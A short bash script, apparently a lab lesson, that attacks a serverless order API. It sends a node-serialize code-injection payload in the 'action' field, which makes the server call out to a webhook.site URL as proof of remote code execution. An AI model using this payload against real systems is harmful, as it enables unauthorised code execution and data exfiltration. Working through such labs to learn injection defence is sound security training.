#!/usr/bin/env bash
set -euo pipefail

# Lesson 3 - Sensitive Information Disclosure / Code Injection
# Replace these values before running.
API="https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
TOKEN="<your_token>"
WEBHOOK_URL="http://webhook.site/<your-webhook-id>"

# 1) Baseline normal request
curl -s -X POST "$API" \
  -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{"action":"get_cart","cart_id":"test"}'

echo

# 2) RCE outbound webhook proof
PAYLOAD=$(cat <<JSON
{
  "action": "_\$\$ND_FUNC\$\$_function(){require('http').get('$WEBHOOK_URL?test=hello')}()",
  "cart_id": "test"
}
JSON
)

curl -s -X POST "$API" \
  -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw "$PAYLOAD"

echo
